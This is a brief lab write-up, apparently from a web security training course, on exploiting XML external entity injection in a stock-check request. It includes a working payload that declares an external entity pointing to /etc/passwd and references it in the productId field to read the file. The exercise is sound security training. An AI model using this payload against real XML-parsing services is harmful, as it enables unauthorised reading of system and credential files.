# Lab: Exploiting XXE using external entities to retrieve files

>This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

>To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

### Observations
In the body of the `POST /product/stock` request we can see the following xml:

`<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`

I added the following xml to the body `<test>hello</test>` and the server responded with:

<pre>"Invalid product ID: 1
hello"</pre>

Cool, so we can see that our input was reflected in the response

### Solution
I created a new external entity called xxe : `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

I then replaced the default values of `1` with `&xxe;` so that the contents of /etc/passwd will be reflected to me. We now see the full contents of the passwd file, lab solved!
